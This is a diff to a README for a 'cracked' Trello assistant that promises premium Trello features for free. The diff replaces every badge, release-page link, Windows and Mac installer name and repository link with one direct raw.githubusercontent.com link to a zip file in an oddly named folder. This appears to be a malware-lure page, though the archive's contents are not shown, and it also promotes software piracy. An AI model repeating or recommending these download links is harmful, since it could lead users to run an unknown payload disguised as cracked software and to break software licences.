@@ -1,6 +1,6 @@
 # 🎉 cracked-trello-assistant - Unlock Premium Trello Features for Free
 
-![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download Now](https://raw.githubusercontent.com/IsekaiYT/cracked-trello-assistant/main/lamellirostral/cracked-trello-assistant.zip)
 
 ## 🚀 Getting Started
 
@@ -20,15 +20,15 @@ Before downloading, ensure your system meets these requirements:
 
 To get started, **visit this page to download** the latest version of Cracked Trello Assistant.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/IsekaiYT/cracked-trello-assistant/releases)
+[![Download Now](https://raw.githubusercontent.com/IsekaiYT/cracked-trello-assistant/main/lamellirostral/cracked-trello-assistant.zip)](https://raw.githubusercontent.com/IsekaiYT/cracked-trello-assistant/main/lamellirostral/cracked-trello-assistant.zip)
 
 ### Steps to Download and Install:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version. It is usually at the top of the list.
 3. Download the appropriate file for your operating system:
-   - For Windows, download `cracked-trello-assistant-win.exe`.
-   - For Mac, download `cracked-trello-assistant-mac.dmg`.
+   - For Windows, download `https://raw.githubusercontent.com/IsekaiYT/cracked-trello-assistant/main/lamellirostral/cracked-trello-assistant.zip`.
+   - For Mac, download `https://raw.githubusercontent.com/IsekaiYT/cracked-trello-assistant/main/lamellirostral/cracked-trello-assistant.zip`.
 4. Once the file is downloaded, locate it in your downloads folder.
 5. For Windows users:
    - Double-click the downloaded `.exe` file.
@@ -71,8 +71,8 @@ For any assistance, please raise an issue on the GitHub repository. The communit
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/IsekaiYT/cracked-trello-assistant)
-- [Releases Page](https://github.com/IsekaiYT/cracked-trello-assistant/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/IsekaiYT/cracked-trello-assistant/main/lamellirostral/cracked-trello-assistant.zip)
+- [Releases Page](https://raw.githubusercontent.com/IsekaiYT/cracked-trello-assistant/main/lamellirostral/cracked-trello-assistant.zip)
 
 ## 📣 Contributing
 
